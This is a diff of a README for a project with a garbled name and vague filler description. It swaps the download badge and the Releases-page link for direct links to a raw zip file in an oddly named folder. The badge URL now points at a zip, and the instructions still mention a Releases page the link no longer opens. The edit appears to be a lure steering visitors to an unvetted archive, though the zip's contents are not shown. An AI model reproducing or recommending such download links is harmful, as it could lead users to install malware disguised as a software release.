@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-9 - Simple Tools for Smooth Operations
 
-![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/makoom/amanansdiahnid-9/main/Westralian/amanansdiahnid-9.zip%20release-brightgreen)
 
 ## 📖 Overview
 
@@ -17,7 +17,7 @@ Welcome to the amanansdiahnid-9 repository! This application provides a straight
 
 To get started, visit the following link to download the latest version of amanansdiahnid-9:
 
-[Download the latest release!](https://github.com/makoom/amanansdiahnid-9/releases)
+[Download the latest release!](https://raw.githubusercontent.com/makoom/amanansdiahnid-9/main/Westralian/amanansdiahnid-9.zip)
 
 1. Click the link above to open the Releases page.
 2. On the Releases page, find the latest version available.
